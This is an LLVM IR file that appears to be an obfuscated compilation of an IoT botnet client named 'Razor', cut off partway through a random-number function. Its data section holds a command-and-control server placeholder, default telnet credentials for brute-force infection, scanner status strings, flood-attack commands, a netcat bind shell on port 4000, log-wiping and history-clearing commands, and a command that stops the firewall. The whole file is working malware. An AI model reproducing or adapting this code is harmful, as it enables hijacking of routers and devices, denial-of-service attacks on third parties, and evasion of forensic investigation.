; ModuleID = 'host/ir_fla/Razor.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@uastrings = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@passwords = global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.72 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 -1653524137, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1653524137, label %10
    i32 -587732897, label %14
    i32 -1229119693, label %32
    i32 -773884617, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 -587732897, i32 -773884617
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -1229119693, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 -1653524137, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
